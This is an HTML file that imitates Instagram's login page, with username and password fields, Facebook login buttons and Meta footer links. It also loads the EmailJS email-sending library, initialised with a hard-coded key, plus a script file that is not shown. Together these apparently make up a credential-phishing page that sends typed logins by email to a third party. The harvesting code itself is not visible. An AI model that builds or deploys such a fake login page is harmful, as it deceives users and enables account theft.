<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.min.css">
    <link rel="icon" type="image/x-icon" href="./icons/instagram .png">
    <title>Instagram</title>
</head>
<body>
    <div class="container">
        <section class="slider">
            <img src="img/insta-slider-main.png" alt="insta slider">
        </section>
        <section class="form__container">
            <div class="form">
                <img src="./icons/Screenshot_20230211_030713.png" alt="">
                <div class="facebook_mobile">
                    <img src="./icons/facebook_mobile.png" alt="">
                    <button> 
                       Continue with Facebook 
                    </button>
                </div>
                <div class="or or_mobile">
                    <hr class="left">
                    <span>or</span>
                    <hr class="right">
                </div>
                <form class="form_log-in">
                    <input id="login" type="text" name="login" placeholder="Phone, number, username or email ">
                    <input id="password" type="password" name="password" placeholder="Password">
                    <div class="show">Show</div>
                    <div class="hide">Hide</div>
                    
                    <div class="forgot forgot_mobile">Forgot password?</div>
                    <button id="submit">
                        <div class="spinner">
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                style="margin:0 auto; background: none; display:block"
                                width="30px"
                                height="30px"
                                viewBox="0 0 100 100"
                                preserveAspectRatio="xMidYMid"
                            >
                                <g transform="translate(80,50)">
                                <g transform="rotate(0)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="1">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.875s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.875s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(71.21320343559643,71.21320343559643)">
                                <g transform="rotate(45)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.875">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.75s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.75s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(50,80)">
                                <g transform="rotate(90)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.75">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.625s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.625s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(28.786796564403577,71.21320343559643)">
                                <g transform="rotate(135)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.625">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.5s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.5s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(20,50.00000000000001)">
                                <g transform="rotate(180)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.5">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.375s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.375s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(28.78679656440357,28.786796564403577)">
                                <g transform="rotate(225)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.375">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.25s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.25s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(49.99999999999999,20)">
                                <g transform="rotate(270)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.25">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="-0.125s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="-0.125s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                                <g transform="translate(71.21320343559643,28.78679656440357)">
                                <g transform="rotate(315)">
                                    <circle cx="0" cy="0" r="7" fill="#1c4595" fillOpacity="0.125">
                                    <animateTransform
                                        attributeName="transform"
                                        type="scale"
                                        begin="0s"
                                        values="1.5 1.5;1 1"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                    ></animateTransform>
                                    <animate
                                        attributeName="fillOpacity"
                                        keyTimes="0;1"
                                        dur="1s"
                                        repeatCount="indefinite"
                                        values="1;0"
                                        begin="0s"
                                    ></animate>
                                    </circle>
                                </g>
                                </g>
                            </svg>
                        </div>
                        <span> Log in</span>
                    </button>
                    <div class="or">
                        <hr class="left">
                        <span>or</span>
                        <hr class="right">
                    </div>
                    <div class="faceebook">
                        <img src="./icons/facebook.png" alt="">
                        <span>Log in with Facebook</span>
                    </div>
                    <div class="forgot">Forgot password?</div>
                </form>
                
            </div>
            <div class="sign-in">
                Don't have an accaunt? <span>Sign up</span>
            </div>
            <div class="app">
                <span>Get the app.</span>
                <div class="app_stores">
                     <img src="./img/stores_eng.png" alt="">
                     
                </div>
            </div>
        </section>
    </div>

    <div class="from-meta">
        <img src="./icons/meta_main.png" alt="">
    </div>

    <footer>
        <div class="links">
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.meta.com/">Blog</a>
            <a href="https://about.meta.com/">Jobs</a>
            <a href="https://about.meta.com/">Help</a>
            <a href="https://about.meta.com/">API</a>
            <a href="https://about.meta.com/">Privacy</a>
            <a href="https://about.meta.com/">Terms</a>
            <a href="https://about.meta.com/">Top Accounts</a>
            <a href="https://about.meta.com/">Locations</a>
            <a href="https://about.meta.com/">Instagram Lite</a>
            <a href="https://about.meta.com/">Contact Uploading & Non-users</a>
        </div>
        <div class="language">
            <select name="language" id="lang">
                <option value="English">English</option>
                <option value="afr">Afrikaans</option>
                <option value="ces">Čeština </option>
                <option value="dan">Dansk</option>
                <option value="deu">Deutsch</option>
                <option value="esp">Espaniola</option>
                <option value="rus">Русский</option>
                <option value="ukr">Українська</option>
            </select>
            <span>© 2023 Instagram from Meta</span>
        </div>
    </footer>
    
    <script type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
    </script>
    <script type="text/javascript">
    (function(){
    emailjs.init("N5SjRwEWJNNiiethQ");
    })();
    </script>
    <script src="js/index.js"></script>
</body>
</html>
